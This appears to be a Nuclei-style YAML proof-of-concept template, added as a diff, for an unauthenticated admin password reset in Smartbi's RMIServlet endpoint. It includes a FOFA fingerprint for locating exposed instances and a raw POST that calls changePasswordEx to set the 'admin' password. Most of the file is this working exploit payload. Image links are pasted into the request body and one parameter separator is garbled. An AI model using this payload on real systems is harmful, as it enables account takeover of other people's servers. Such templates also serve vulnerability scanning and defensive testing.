@@ -1,0 +1,32 @@
+id: poc-gdpee0wgnwm4xufd
+info:
+  name: Smartbi接口RMIServlet 用户密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdpee0wgnwm4xufd'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gdpee0wgnwm4xufd
+    fofa: body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
+http:
+- raw:
+  - 'POST /smartbi/vision/RMIServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+
+    className=UserService&methodName=changePasswordEx¶ms=["admin","","1"]
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351441960-3523dc23-3077-4c71-b528-39b5680d33aa.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351442209-819ac3ea-7454-4c8c-8831-bab492243738.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
